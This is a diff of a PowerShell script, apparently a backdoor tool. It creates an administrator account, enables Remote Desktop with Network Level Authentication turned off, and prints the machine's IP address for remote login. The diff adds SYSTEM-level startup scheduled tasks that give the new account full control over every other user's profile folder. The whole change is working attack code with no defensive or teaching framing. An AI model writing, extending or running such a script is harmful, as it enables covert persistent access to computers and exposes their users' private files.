@@ -61,20 +61,6 @@ function New-AdminAccount {
         Write-Output "The 'Remote Desktop Users' group was not found."
     }
 
-    # Share other users' files and folders with the new admin account
-    $usersPath = "C:\Users"
-    $users = Get-ChildItem -Path $usersPath | Where-Object { $_.PSIsContainer -and $_.Name -ne $username -and $_.Name -ne "Public" }
-
-    foreach ($user in $users) {
-        $userProfilePath = Join-Path -Path $usersPath -ChildPath $user.Name
-
-        # Share the user's profile folder with the new admin account
-        icacls $userProfilePath /grant "${username}:(OI)(CI)F"
-        Write-Output "Granted full control of $userProfilePath to $username."
-    }
-
-    Write-Output "Files and folders of other users have been shared with the new admin account '$username'."
-
     # Enable Remote Desktop
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
     Write-Output "Remote Desktop has been enabled."
@@ -96,13 +82,31 @@ function New-AdminAccount {
         Write-Output "User Authentication has been disabled for Remote Desktop."
     }
 
-    # Output the computer name for remote access
+    # Share other users' files and folders with the new admin account using a scheduled task
+    $usersPath = "C:\Users"
+    $users = Get-ChildItem -Path $usersPath | Where-Object { $_.PSIsContainer -and $_.Name -ne $username -and $_.Name -ne "Public" }
+
+    foreach ($user in $users) {
+        $userProfilePath = Join-Path -Path $usersPath -ChildPath $user.Name
+
+        # Create a scheduled task to run icacls.exe with elevated permissions
+        $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\icacls.exe" -Argument "`"$userProfilePath`" /grant `"$username`":(OI)(CI)F"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "GrantPermissionsTask_$($user.Name)"
+        Write-Output "Scheduled task created to grant full control of $userProfilePath to $username."
+    }
+
+    Write-Output "Files and folders of other users have been scheduled to be shared with the new admin account '$username'."
+
+    # Output the computer name and IP address for remote access
     $computerName = (Get-WmiObject -Class Win32_ComputerSystem).Name
-    Write-Output "The computer name is '$computerName'. Use this name or the IP address to remotely access this computer."
+    $ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" }).IPAddress
+    Write-Output "The computer name is '$computerName'. The IP address is '$ipAddress'. Use this name or IP address to remotely access this computer."
 }
 
 # Example usage
-New-AdminAccount -username "NewAdminUser5"
+New-AdminAccount -username "NewAdminUser7"
 ##################################################################################################################################################################
 #==============================End================================================================================================================================
 ##################################################################################################################################################################
